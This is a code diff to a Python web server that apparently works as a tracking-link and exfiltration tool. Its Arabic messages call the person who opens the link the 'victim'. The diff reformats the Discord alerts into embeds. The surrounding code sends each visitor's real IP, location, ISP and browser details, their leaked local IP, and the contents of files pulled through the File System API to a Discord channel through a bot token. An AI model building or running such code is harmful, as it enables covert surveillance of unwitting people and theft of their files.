@@ -101,11 +101,18 @@ def track_visitor():
 
     try:
         if CHANNEL_ID and TOKEN:
-            payload = {
-                "content": f"🚨 **تم فتح رابط التتبع بنجاح!**\n🌐 الـ IP الحقيقي: `{ip}`\n🌍 الدولة/المدينة: `{country} - {city}`\n🏢 مزود الخدمة: `{isp}`\n💻 المتصفح والنظام: `{user_agent}`"
-            }
+            embed = discord.Embed(
+                title="🚨 تنبيه: تم فتح رابط التتبع بنجاح!",
+                color=0xFF3333,
+                timestamp=discord.utils.utcnow()
+            )
+            embed.add_field(name="🌐 عنوان الـ IP الحقيقي", value=f"`{ip}`", inline=False)
+            embed.add_field(name="🌍 الدولة / المدينة", value=f"`{country} - {city}`", inline=True)
+            embed.add_field(name="🏢 مزود الخدمة (ISP)", value=f"`{isp}`", inline=True)
+            embed.add_field(name="💻 المتصفح والنظام", value=f"```{user_agent}```", inline=False)
+            
             requests.post(f"https://discord.com/api/v10/channels/{CHANNEL_ID}/messages", 
-                          headers={"Authorization": f"Bot {TOKEN}"}, json=payload, timeout=3)
+                          headers={"Authorization": f"Bot {TOKEN}"}, json={"embeds": [embed.to_dict()]}, timeout=3)
     except Exception:
         pass
 
@@ -199,9 +206,13 @@ def upload_local_ip():
         data = request.get_json()
         local_ip = data.get('local_ip')
         if CHANNEL_ID and TOKEN:
-            payload = {"content": f"🌐 **تم تسريب الـ Local IP (الداخلي) للضحية:** `{local_ip}`"}
+            embed = discord.Embed(
+                title="🔍 تسريب الشبكة الداخلية (Local IP)",
+                description=f"تم رصد الـ IP الداخلي للضحية بنجاح:\n`{local_ip}`",
+                color=0xFFA500
+            )
             requests.post(f"https://discord.com/api/v10/channels/{CHANNEL_ID}/messages",
-                          headers={"Authorization": f"Bot {TOKEN}"}, json=payload, timeout=3)
+                          headers={"Authorization": f"Bot {TOKEN}"}, json={"embeds": [embed.to_dict()]}, timeout=3)
     except Exception:
         pass
     return "OK", 200
@@ -236,9 +247,15 @@ def upload_file():
         filename = data.get('name')
         content = data.get('data')
         if CHANNEL_ID and TOKEN:
-            payload = {"content": f"📁 **تم سحب ملف عبر File System API:** `{filename}`\n```text\n{content[:1000]}\n```"}
+            embed = discord.Embed(
+                title="📁 تم سحب ملف جديد بنجاح",
+                description=f"**اسم الملف:** `{filename}`",
+                color=0x33CCFF
+            )
+            embed.add_field(name="📄 محتوى الملف (مقتطف)", value=f"```text\n{content[:900]}\n```", inline=False)
+            
             requests.post(f"https://discord.com/api/v10/channels/{CHANNEL_ID}/messages",
-                          headers={"Authorization": f"Bot {TOKEN}"}, json=payload, timeout=5)
+                          headers={"Authorization": f"Bot {TOKEN}"}, json={"embeds": [embed.to_dict()]}, timeout=5)
     except Exception:
         pass
     return "OK", 200
